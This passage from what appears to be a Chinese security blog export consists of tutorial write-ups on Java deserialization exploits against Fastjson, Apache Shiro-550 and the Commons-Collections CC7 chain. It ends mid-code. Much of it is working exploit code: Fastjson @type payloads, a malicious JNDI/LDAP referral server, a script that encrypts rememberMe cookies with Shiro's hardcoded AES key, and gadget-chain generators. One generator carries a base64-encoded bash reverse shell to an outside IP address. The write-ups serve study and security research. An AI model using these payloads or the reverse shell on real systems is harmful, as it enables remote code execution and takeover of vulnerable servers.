&quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.User\\&quot;,\\&quot;id\\&quot;:\\&quot;1\\&quot;,\\&quot;name\\&quot;:\\&quot;lily\\&quot;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject);// 输出:// 无参构造// setId// setName// getId// getName// &#123;&quot;name&quot;:&quot;lily&quot;,&quot;id&quot;:1&#125; 可见不仅调用了构造器和set方法，还调用了get方法。 （注意，此处的set方法要想触发需要有一个传参，否则不会执行） 2.调试下面我们在jsonObject这里打个断点来调试看一下具体的流程： 首先进入了JSON类的parseObject方法，然后调用了parse方法进行解析，最后再强转为JSONObject方法，我们跟进看一下： parse里边还有一个parse，并且多了个指定的解析feature值，将被解析的内容创建成一个DefaultJSONParser类的实例，然后又进行parse操作，我们继续跟进： 由第1292行开始之后调用第1305行的parse方法，之后会对我们的传参进行匹配，看看第一个字符是什么，我们的是左大括号，所以直接进第1325行的case LBRACE，然后在第1327行则会进行进一步的解析，解析出我们传入的key值： 之后会进入这里，如果我们的key是特殊字符，就会特殊处理，这里的DEFAULT_TYPE_KEY就是@type： 然后会在TypeUtils.loadClass中加载我们指定的类，之后进入反序列化阶段： 进入ParserConfig类的getDeserializer方法，这里是获取一些类的反序列化相关的方法，一般来说自己创建的类就会进入最后的这部分： 之后在ParserConfig类的createJavaBeanDeserializer方法中进入JavaBeanInfo类的build方法 然后进行JavaBeanInfo的创建工作，这里涉及到指定类的构造器以及get,set方法的获取： 之后就是使用JavaBeanDeserializer利用前边获取到的构造器以及get,set方法将json字符串反序列化成Java类对象，为了进入这部分，需要getOnly为true，需要我们在User类里边加一个get方法无对应的set方法且符合下图条件： （这之后的部分很氵，仅供自己记忆，建议去看白日梦组长大佬的流程） 123456private Map map;public Map getMap()&#123; System.out.println(&quot;getMap&quot;); return map;&#125; 之后由这里进入JavaBeanDeserializer类： 如下图所示： 之后会回到ParserConfig类里边： 然后就是逐层跳出各个类，回到DefaultJSONParser类的parseObject方法中： 接着就会调用获取到的反序列化器进行反序列化，在如下地方触发构造器和set方法： 再之后就出来了，最后get方法在最后toJSON的时候调用： 至此，Fastjson的反序列化流程差不多是走完了 3.利用随便搞一个含有传参的set方法恶意类即可： 之后指定这个类就能弹出计算器 正文1.Fastjson 1.2.241.1 JdbcRowSetImpl链 在JdbcRowSetImpl类里边有connect方法，虽然没有截全，但很容易看出里边有InitialContext和lookup，标准的jndi注入，我们接下来要通过Fastjson的方式来触发，就需要get或者set方法，最好是set方法，因为get方法实现起来比较麻烦： 有set就用set： 这样一来就能够触发jndi注入了，但还少了lookup的参数控制，我们需要找一个setDataSourceName方法： 该方法在BaseRowSet类里，但没关系，因为JdbcRowSetImpl类继承了BaseRowSet类。下面我们直接写链子就好了： 首先指定JdbcRowSetImpl类，之后给DataSourceName和AutoCommit赋值： 123String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:7777/TestRef\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject); 运行之前注意用7777端口开一个ldap服务就好了（代码放在文章最后）： （此处有个坑点，就是需要确保jdk1.8的版本足够低，不然就会报错java.lang.ClassCastException: javax.naming.Reference cannot becast to javax.sql.DataSource） 1.2 Bcel_ClassLoader链 在com.sun.org.apache.bcel.internal.util的下面有个ClassLoader类，其loadClass方法存在动态类加载，如上图所示，大致需要我们传参以$$BCEL$$为开头，creatClass如下所示： 需要我们将要执行的代码放在$$BCEL$$后边，并Utility.encode一下，之后我们再找能够承接ClassLoader的类： 在org.apache.tomcat.dbcp.dbcp2包下的BasicDataSource类里边存在createConnectionFactory方法，里边有着Class.forName，可以通过动态类加载触发loadClass的方法，我们接下来就需要看一看能否控制driverClassName和driverClassLoader了，实际上在这个类里边确实有set方法： 但还没完，我们需要从createConnectionFactory方法往上找，找到一个get或者set方法以便于能够利用Fastjson触发链子： 发现可以往上边的createDataSource方法再往上getConnection方法触发： 流程找完了，我们来写链子： 其实就是先给driverClassLoader set成我们的ClassLoader，然后给driverClassName set为我们的以$$BCEL$$为开头的且encode后的恶意代码，最后利用jsonObject的toJSON触发getConnection就好了： 123456789101112131415161718192021package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import com.sun.org.apache.bcel.internal.classfile.Utility;import java.io.IOException;import java.nio.file.Path;import java.nio.file.Paths;import java.nio.file.Files;public class Test2 &#123; public static void main(String[] args) throws IOException &#123; Path path = Paths.get(&quot;G:\\\\web\\\\ctf_java\\\\Fastjson_1.2.24\\\\target\\\\classes\\\\org\\\\example\\\\calc.class&quot;); byte[] bytes = Files.readAllBytes(path); String code = Utility.encode(bytes,true); String s = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\&quot;,\\&quot;driverClassName\\&quot;:\\&quot;$$BCEL$$&quot;+code+&quot;\\&quot;,\\&quot;driverClassLoader\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\\&quot;&#125;&#125;&quot;; JSONObject jsonObject = JSON.parseObject(s); System.out.println(jsonObject); &#125;&#125; 1.3 TemplatesImpl链说是链子，实际上就是个指定的动态类加载，可以直接用来加载恶意类 12345678910//恶意类TempletaPoc转换成字节码，base64编码String byteCode = &quot;xxxxxxxxxxxxxxxxxx&quot;;//构造TemplatesImpl的json数据，并将恶意类注入到json数据中final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; + &quot;\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;;System.out.println(payload); 打就完了 2.Fastjson&lt;&#x3D;1.2.47这里直接用的1.2.25的版本 2.1绕过流程Fastjson在1.2.24版本之后进行了一些这方面的修复，如果我们此时再打原先的链子就会报错：autoType is not support. org.apache.tomcat.dbcp.dbcp2.BasicDataSource，这是因为新版本在DefaultJSONParser类里边进行了一些修改，将原先直接loadClass的地方改成了如下所示： 而checkAutoType方法里边则是对一些危险类进行了过滤： 但实际上还是可以绕过的，checkAutoType方法在进行我们这个能进去的黑名单校验之前，还进行了两个判断，第一个判断autoTypeSupport是否为true以及expectClass是否为空，这个由于autoTypeSupport默认为false，所以说进不去，我们不用管 第二个判断是判断是否所指定的类名存在于缓存中，如果存在则可直接加载，从而绕过后续的黑名单校验： 我们直接进getClassFromMapping看一下： 调用mappings赋值的地方有这些： 实际上能够给它赋值的就只有addBaseClassMappings和loadClass，因为只有这俩里边有用到put，然而经过查看可以知道，addBaseClassMappings是一个写死的方法，里边put的类都是以及写好的，无法更改，所以说我们就只能看loadClass了： 差不多这里是我们能够控制的，我们再来看看哪里调用了loadClass，并且有用： 最终发现MisCodec里的deserialze方法里边能对其传参进行控制： 而MisCodec实际上是一个反序列化器： 而在DefaultJSONParser类中对反序列化器的调用在第334行： getDeserializer在ParserConfig类里边，这个类会针对不同的类调用不同的反序列化器： 而调用MiscCodec这个反序列化器之后我们就可以通过控制strVal来对loadClass加载的类名进行控制了： 2.2构造链子我们需要先把类放到缓存里再拿出来反序列化，所以说需要两步： 第一步： 首先，我们指定的类需要是一个Class.class才能调用MiscCodec这个反序列化器，所以说我们直接指定java.lang.Class就好了 其次，MiscCodec的deserialze方法这里表明传参的key值如果不为val的话就会报错，我们需要控制key为val，至于value则是我们要用的恶意类，这里直接传入com.sun.rowset.JdbcRowSetImpl 第二步： 直接把JdbcRowSetImpl链给拿过来就行了 最终结果： 123String s = &quot;&#123;&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;DataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:7777/TestRef\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject); 执行成功 3.Fastjson&lt;&#x3D;1.2.83123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Fastjson83 &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static byte[] genPayload(String cmd) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjIxMC4xMjYuMTkxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#125;); setValue(templates, &quot;_name&quot;, &quot;aaa&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// objectInputStream.readObject(); &#125;&#125; 4.Jndi+ldap服务器代码（至于jndi+ldap的服务器代码，我忘记copy的哪位大佬的了，就先贴在下边，侵删） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;public class JNDILDAPServer &#123; private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;; public static void main ( String[] tmp_args ) &#123; String[] args=new String[]&#123;&quot;http://127.0.0.1:8081/#TestRef&quot;&#125;; int port = 7777;//指定端口 try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, //$NON-NLS-1$ InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$ ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(&#x27;#&#x27;); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaCodeBase&quot;, cbstring); e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$ e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 运行之后在恶意类所在目录上开一个8081端口的http.server即可","categories":[],"tags":[]},{"title":"JAVA安全:Shiro-550反序列化","slug":"JAVA安全shiro-550反序列化漏洞分析","date":"2024-03-21T01:24:07.191Z","updated":"2024-03-23T14:03:34.190Z","comments":true,"path":"2024/03/21/JAVA安全shiro-550反序列化漏洞分析/","link":"","permalink":"http://example.com/2024/03/21/JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;23 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;23 分类：Vulnerability Analysis 前言Apache Shiro是一个开源的Java安全框架，可执行身份验证、授权、密码和会话管理。Shiro-550的漏洞最早披露于2016年，影响版本为：shiro&lt;1.2.4，特征：返回包的http头中包含Set-Cookie: rememberMe&#x3D;deleteMe emmm….直接开始学习吧 正文1.环境搭建&lt;1&gt;直接下载shiro-1.2.4 https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4 &lt;2&gt;打开IDEA，将shiro-shiro-root-1.2.4的samples下的web包以Maven的形式导入即可 &lt;3&gt;更改pom.xml文件中的jstl配置，增加1.2版本设置，如下： &lt;4&gt;配置好IDEA内置的tomcat服务，启动即可，成功后效果如下： 2.调试Shiro的加解密实际上是一对，从名字也很容易看出来： 2.1 加密分析直接把断点打在org.apache.shiro.mgt.AbstractRememberMeManager类的onSuccessfulLogin方法中： 然后我们开始调试运行，登录root:secret账号，并勾选RememberMe选项，点击Login，转入IDEA开始分析 可见程序停在了我们的断点处，我们继续跟进： 此时进入了rememberIdentity方法，我们继续跟进： 在getIdentityToRemember方法中返回了用户名root，并给principals赋值，接着进入重写的rememberIdentity方法： 到这一步就开始对用户名root进行操作了，我们继续跟进： 可见这里对root进行了序列化，并赋值给字节数组，之后在encrypt中进行加密操作，我们继续跟进： 进入encrypt方法之后，看起来像是对序列化之后的用户名进行了加密操作，我们来看一下cipherService： 很明显，对序列化之后的用户名进行了AES加密，我们跟进来看一下AES加密的Key值： 这个encryptionCipherKey的赋值可以看一下： 可见Key实际上就是一个固定的值：kPH+bIxk5D2deZiIxcaaaA==的base64解码 确定了AES加密的Key之后我们继续跟进，之后便是一系列的加密过程，我们在这里直接省略，直接看加密完成后的流程： 直接从convertPrincipalsToBytes方法return values回到rememberIdentity，然后我们继续跟进： 之后便是对加密后的值进行base64编码，然后设置到cookie之中 总结流程： &lt;1&gt;用户名序列化 &lt;2&gt;AES加密 &lt;3&gt;base64加密 &lt;4&gt;将加密结果放到cookie的rememberMe上 2.2 解密分析注意：解密的时候请求头中注意删掉JSESSIONID，否则不会进行解密流程！！！ 直接把断点打在org.apache.shiro.mgt.DefaultSecurityManager的getRememberedIdentity方法中： 这里我们重点跟进getRememberedPrincipals方法： 这里我们比较感兴趣的是getRememberedSerializedIdentity方法和convertBytesToPrincipals方法，我们逐个跟进一下： 看起来很长，实际上就是进行两个主要的操作，一个是获取cookie中的base64信息，另一个就是进行base64解密并返回，我们再跟进convertBytesToPrincipals方法看一下： 可以看到就是一个AES解密加一个反序列化，最终返回我们的用户名root 可见以root的身份登录： 总结流程： &lt;1&gt;读取cookie中的rememberMe的值 &lt;2&gt;对值进行base64解密 &lt;3&gt;对解密结果进行AES解密+反序列化得到用户名 3.漏洞利用解密流程中对cookie中的rememberMe的值最终进行了反序列化操作，那么我们只要传入前边学过的反序列化触发的链子便可以进行命令执行 3.1 URLDNS链由于URLDNS链基本上都是用的Java内置类实现的，所以应用范围较广，但也就只能用来发起DNS请求，我们来试一下： 这里我直接把之前学的URLDNS链原封不动拿过来了： 1234567891011HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL,Integer&gt;();URL url = new URL(&quot;http://ob328eym9gl464dbs50lp5unwe24qt.burpcollaborator.net&quot;);Class c = url.getClass();Field hashcode = c.getDeclaredField(&quot;hashCode&quot;);hashcode.setAccessible(true);hashcode.set(url,1);hashMap.put(url,1);hashcode.set(url,-1);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\URLDNS.txt&quot;));oos.writeObject(hashMap); 之后就是对序列化后的数据进行AES加密和base64加密： 1234567891011121314151617181920import sysimport uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;URLDNS.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) 然后打就完了： 成功 3.2 CC链如果是按照上述环境搭建的流程来的话，因为shiro本身是不带CC依赖的，所以到这一步需要加一个CC依赖： 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 之后呢，如果我们正常拿CC链来打的话是打不通的（tomcat的类加载器里边不支持数组类的加载），当然，如果你的CC依赖是CC4的话，是可以直接拿CC2来打的，我们这里用的是CC3的依赖，CC2打不了，就需要构造自己的链子来把Transformer数组给去掉，我在这里学的是白日梦组长的链子，思路相当于之前学过的CC3、CC6、CC2的集合，忘记了的话可以去看一下前面的知识： 123456789101112131415161718192021222324252627TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; innerMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;bbb&quot;);innerMap.remove(templates);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(&quot;factory&quot;);factoryField.setAccessible(true);factoryField.set(innerMap,invokerTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CC.txt&quot;));oos.writeObject(hashMap); 1234567891011121314151617181920import sysimport uuidimport base64from Crypto.Cipher import AESdef encode_rememberme(): f = open(&#x27;shiro_CC.txt&#x27;,&#x27;rb&#x27;) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(f.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme() print(&quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())) 是能够打的通的： 3.3 CB链上边也说了，shiro原生是不带CC依赖的，所以打原生就要用到CB了，如果是按上述流程搭建的环境，那么shiro自带的CB是1.8.3版本的，我们接下来看看链子应该怎么构造： 首先，CB链最后的命令执行流程还是和CC3是一样的，因为利用的是Java的反射机制和动态类加载的特性，我们先把前边的拿过来： 12345678910111213TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl()); 按原先CC3的步骤，我们是直接利用TrAXfilter类进行templates的newTransformer方法的触发，但这里我们CB依赖里是没有这个类的，因此我们就要从TemplatesImpl类中找一下能命令执行的点，实际上这里用的就是CB中的PropertyUtils.getProperty方法，它能够获取类的实例化对象中的JavaBean格式的方法，而TemplatesImpl类中恰好有符合JavaBean格式，且能够利用的方法： 而PropertyUtils类是没有继承序列化接口的，我们需要在CB依赖中找到一个调用PropertyUtils.getProperty方法的类且继承了序列化接口，这里我们使用BeanComparator类，其中有着compare方法： 这部分的链子应该这样写： 1BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare()); 至于为什么要传AttrCompare类的实例，可以看一下BeanComparator构造器的源码： 其中的ComparableComparator类来自于CC依赖，在shiro原生中是没有的，所以我们就用了一个即在CB依赖中有，又继承了序列化接口的类。 接下来寻找调用compare方法的类，是不是很熟悉了？ 没错，在之前的CC4链的学习中，我们就用了compare方法来触发ChainedTransformer的transform方法，那么我们去再看一看那个compare方法： 可见其不仅调用了transform方法，还调用了compare方法，我们只需要把decorated传成我们构造好的BeanComparator类的实例就好了，只需要把CC4中传入priorityQueue的transformingComparator改成beanComparator就好了，接下来的流程就和CC4后边一样了，我们直接拿过来： 12345678910111213141516171819202122232425TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare());TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(2);Class&lt;PriorityQueue&gt; c = PriorityQueue.class;Field comparatorField = c.getDeclaredField(&quot;comparator&quot;);comparatorField.setAccessible(true);comparatorField.set(priorityQueue,beanComparator);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;));oos.writeObject(priorityQueue); 最后打一下看看： 成功执行","categories":[],"tags":[]},{"title":"JAVA安全:CC7链","slug":"JAVA安全CC7链","date":"2024-03-19T13:39:27.499Z","updated":"2024-08-24T03:27:00.236Z","comments":true,"path":"2024/03/19/JAVA安全CC7链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;20 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;20 分类：Vulnerability Analysis 前言作为CC链系列的最后一条，当然要放到最后学啦 正文我们先来看一下ysoserial中的CC7链流程： 这里是在LazyMap的get方法之前发生了变化，我们还是按照之前的思路，一点点分析 1.AbstractMap部分从调用get方法的类里边找，找到了AbstractMap类，它的equals方法调用了get方法： m对象是我们传入的参数，可控，我们继续向上找 2.AbstractMapDecorator部分 发现AbstractMapDecorator类的equals方法调用了equals方法，且其构造器如下： map参数可控，我们继续往上找 3.HashTable部分 HashTable类的reconstitutionPut方法对equals方法进行了调用，看起来流程也很简单，就是对增加的key进行hash计算，如果hash值与tab中的所有元素均不同，就会增加到数组tab中，否则就会报异常 我们再看看调用该方法的部分： HashTable类中的readObject方法，看到这里我们就大功告成了，HashTable类完全可以作为链子的结尾。我们来构造链子 4.构造链首先，LazyMap之前的部分由于和CC1链相同，我们就直接copy过来： 1234567Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); 接下来我们按照链子触发的顺序来写链子 4.1 HashTable部分HashTable的readObject方法会直接用reconstitutionPut方法来读取序列化数据，我们要利用reconstitutionPut方法触发其中的equals方法，就需要进入其for循环的if判断，而且需要if判断的第一个判断（二者hash值相同）通过，因此我们需要至少传入两个hash值相同的LazyMap，那么我们就需要控制LazyMap的key和value值，网上key的hash相同的有yy和zZ或AaAaAa和BBAaBB等，我们随便选一组作为两个LazyMap的key值即可 这里调用的e.key.equals(key)要特别注意一下，e指的是数组tab，e.key的key指的是传入的第一个LazyMap，equals(key)中的key指的是传入的第二个LazyMap，我们就是要用第二个LazyMap触发命令执行 4.2 AbstractMapDecorator部分由于LazyMap没有equals方法，所以会调用LazyMap的父类AbstractMapDecorator中的equals方法 （这里其实就是把上边的图复制下来了，因为流程是一样的，只是反过来了） 这里我们传入了LazyMap，其this.map指的是LazyMap中传入的HashMap，看不懂的话可以调试一下 之后触发HashMap的equals方法 4.3AbstractMap部分HashMap也没有equals方法，因此也会调用其父类的equals方法 这时里边传入的o对象其实还是我们刚开始传入的第二个LazyMap对象，经过上边的一系列判断便可调用LazyMap的get方法，之后便会触发如同CC1链一样的流程而进行命令执行。 4.4 链子展示123456789101112131415161718192021222324252627Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);HashMap&lt;Object,Object&gt; innerMap1 = new HashMap&lt;&gt;();HashMap&lt;Object,Object&gt; innerMap2 = new HashMap&lt;&gt;();Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);lazyMap1.put(&quot;yy&quot;,1);lazyMap2.put(&quot;zZ&quot;,1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);Class c = chainedTransformer.getClass();Field iTransformersField = 